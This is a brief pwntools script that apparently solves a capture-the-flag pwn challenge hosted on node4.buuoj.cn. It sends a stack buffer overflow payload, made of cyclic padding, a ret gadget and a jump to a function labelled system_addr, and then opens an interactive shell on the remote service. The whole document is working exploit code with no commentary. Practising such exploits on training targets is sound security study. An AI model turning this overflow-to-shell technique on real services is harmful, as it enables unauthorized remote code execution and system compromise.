from pwn import *

#io = process('./pwn1')
io = remote('node4.buuoj.cn',28681)

elf = ELF('./pwn1')

system_addr = 0x401186
ret_addr = 0x401185
payload = cyclic(0xf + 8) + p64(ret_addr) + p64(system_addr)

#io.recv()
io.send(payload)

io.interactive()
